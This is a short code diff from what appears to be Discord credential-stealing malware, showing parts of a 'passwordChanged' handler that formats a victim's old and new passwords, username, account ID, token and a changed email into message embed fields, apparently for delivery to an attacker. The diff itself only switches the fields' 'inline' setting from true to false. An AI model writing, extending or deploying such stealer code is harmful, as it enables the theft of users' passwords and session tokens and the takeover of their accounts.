@@ -737,22 +737,22 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             {
               name: '<a:CoroaDemonsPreta:893483162259300384> Old Password',
               value: `**${oldpassword}**`,
-              inline: true,
+              inline: false,
             },
             {
               name: '<a:CoroaDemonsPreta:893483162259300384> New Password',
               value: `**${newpassword}**`,
-              inline: true,
+              inline: false,
             },
             {
               name: '<:user:984848317836050442> Username',
               value: `\`${json.username}#${json.discriminator}\``,
-              inline: true,
+              inline: false,
             },
             {
               name: '<:id2:814280058402242562> ID',
               value: `\`${json.id}\``,
-              inline: true,
+              inline: false,
             },
             {
               name: '<:bug_hunter:973311712709181542> Token',
@@ -791,17 +791,17 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             {
               name: '<:IconMail:860694971680817212> Email Changed',
               value: `New Email: **${email}**`,
-              inline: true,
+              inline: false,
             },
             {
               name: '<:user:984848317836050442> Username',
               value: `\`${json.username}#${json.discriminator}\``,
-              inline: true,
+              inline: false,
             },
             {
               name: '<:id2:814280058402242562> ID',
               value: `\`${json.id}\``,
-              inline: true,
+              inline: false,
             },
             {
               name: '<:bug_hunter:973311712709181542> Token',
